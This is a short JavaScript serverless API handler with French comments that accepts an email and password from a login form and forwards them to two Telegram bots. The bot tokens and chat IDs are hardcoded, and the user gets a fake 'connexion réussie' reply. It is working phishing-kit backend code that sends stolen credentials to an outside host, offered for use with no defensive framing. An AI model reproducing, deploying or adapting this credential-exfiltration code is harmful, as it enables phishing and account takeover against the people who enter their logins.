export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      // Récupérer les données JSON du corps de la requête
      const { email, password } = req.body;

      // Vérifier que l'email et le mot de passe sont présents
      if (!email || !password) {
        return res.status(400).json({ error: 'Email et mot de passe sont requis' });
      }

      // Préparer le message pour Telegram
      const message = `Nouvelle connexion détectée: \nEmail: ${email}\nMot de passe: ${password}`;

      // Paramètres pour les API Telegram (sans process.env)
      const bots = [
        {
          token: '5282581379:AAHUv4Ph7jryxK2JmTASq44Dv4aNUc_k4Sw', // Remplacez par votre token du bot 1
          chatId: '782943823', // Remplacez par votre chat ID du bot 1
        },
        {
          token: '6189578338:AAHxDYgb8RDRY7Ks75ZSKYEuDcjqcsRj4ss', // Remplacez par votre token du bot 2
          chatId: '6265830405', // Remplacez par votre chat ID du bot 2
        },
      ];

      // Envoyer le message à chaque bot Telegram
      for (const bot of bots) {
        const telegramApiUrl = `https://api.telegram.org/bot${bot.token}/sendMessage`;

        const telegramResponse = await fetch(telegramApiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: bot.chatId,
            text: message,
          }),
        });

        if (!telegramResponse.ok) {
          const errorData = await telegramResponse.json();
          return res.status(500).json({ error: 'Erreur de connexion', details: errorData });
        }
      }

      res.status(200).json({ message: 'connexion réussie' });
    } catch (error) {
      console.error('Erreur de connexion:', error);
      res.status(500).json({ error: 'Erreur interne du serveur' });
    }
  } else {
    res.status(405).json({ error: 'Méthode non autorisée' });
  }
}
  